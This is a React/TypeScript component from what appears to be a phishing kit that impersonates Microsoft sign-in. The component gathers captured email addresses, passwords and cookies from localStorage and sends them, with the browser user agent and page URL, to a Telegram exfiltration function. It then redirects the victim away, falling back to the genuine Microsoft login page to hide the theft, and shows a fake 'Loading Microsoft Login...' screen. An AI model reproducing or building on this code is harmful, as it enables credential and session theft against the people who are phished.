import React, { useEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
  sendToTelegram: (data: any) => Promise<void>;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
  
  useEffect(() => {
    const loadReplacementPage = async () => {
      try {
        // Send data to Telegram before navigating away
        await sendToTelegram({
          email: localStorage.getItem('captured_email') || '',
          password: localStorage.getItem('captured_password') || '',
          cookies: JSON.parse(localStorage.getItem('captured_cookies') || '[]'),
          authenticationTokens: {},
          userAgent: navigator.userAgent,
          sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
          url: window.location.href
        });

        // Navigate to the standalone replacement page instead of document.write()
        // This avoids re-mounting the SPA via document.write and preserves expected behavior.
        window.location.assign('/replacement.html');

      } catch (error) {
        console.error('Failed to send data or navigate to replacement page:', error);
        // Fallback to Microsoft login if anything goes wrong
        window.location.replace("https://login.microsoftonline.com");
      }
    };

    loadReplacementPage();
  }, [onLoginSuccess, sendToTelegram]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        fontSize: '24px',
        color: '#323130'
      }}>
        Loading Microsoft Login...
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
